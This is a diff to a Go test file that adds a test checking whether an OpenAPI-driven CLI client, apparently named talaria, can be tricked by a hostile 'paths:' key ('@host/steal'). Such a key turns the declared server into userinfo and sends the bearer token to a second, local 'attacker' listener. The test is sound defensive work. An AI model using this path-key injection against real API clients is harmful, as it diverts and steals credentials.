@@ -1133,6 +1133,66 @@ func TestASpecMediaTypeCannotInjectAHeader(t *testing.T) {
 	assertNoLeak(t, value, append(res.surfaces(), h.written()...))
 }
 
+// TestASpecPathKeyCannotDivertTheCredential is the wire assertion for §5a's
+// host binding under a hostile `paths:` key.
+//
+// Two listeners, because one cannot tell "withheld" from "sent somewhere else":
+// the spec's servers[] names the allowed one, and the path key `@host:port/...`
+// turns that host into userinfo so the request lands on the attacker's. Nothing
+// on the command line mentions the second host, so the credential has no
+// licence to go there under any reading of the rule.
+func TestASpecPathKeyCannotDivertTheCredential(t *testing.T) {
+	t.Parallel()
+
+	value := canary.Value("pathkey")
+	h := newHarness(t, map[string]string{"TALARIA_AUTH_BEARER": value})
+
+	allowed := newServer(t, `{"ok":true}`)
+	attacker := newServer(t, `{"ok":true}`)
+
+	// The key is the whole exploit: joined to the server URL as text it reads as
+	// `http://<allowed>@<attacker>/steal`, whose host is the attacker.
+	hostile := fmt.Sprintf(`openapi: 3.0.3
+info:
+  title: Hostile Path
+  version: 1.0.0
+servers:
+  - url: %s
+components:
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+security:
+  - bearerAuth: []
+paths:
+  "@%s/steal":
+    get:
+      operationId: steal
+      responses:
+        "200":
+          description: ok
+`, allowed.URL, strings.TrimPrefix(attacker.URL, "http://"))
+
+	specFile := filepath.Join(t.TempDir(), "hostile.yaml")
+	if err := os.WriteFile(specFile, []byte(hostile), 0o600); err != nil {
+		t.Fatalf("writing the hostile spec: %v", err)
+	}
+
+	res := h.run("call", specFile, "steal", "--output", "json")
+
+	// Whatever the exit code, the credential may not have reached the host
+	// nobody declared. The code is how that is reported; this is the property.
+	if got := attacker.received().Header.Get("Authorization"); got != "" {
+		t.Errorf("the undeclared host received an Authorization header — the path key diverted the credential")
+	}
+	if res.code == 0 && !strings.Contains(res.stdout, "credentials_withheld") {
+		t.Errorf("talaria call exited 0 with no credentials_withheld against a diverting path key:\n%s", res.stdout)
+	}
+
+	assertNoLeak(t, value, append(res.surfaces(), h.written()...))
+}
+
 // TestABodyFileSecretReachesNoOutputSurface closes the blind spot §5a's suite
 // had: every mechanism above puts the canary in a *credential* position, and
 // none put one in the request body. A body read from `--body @file` was written
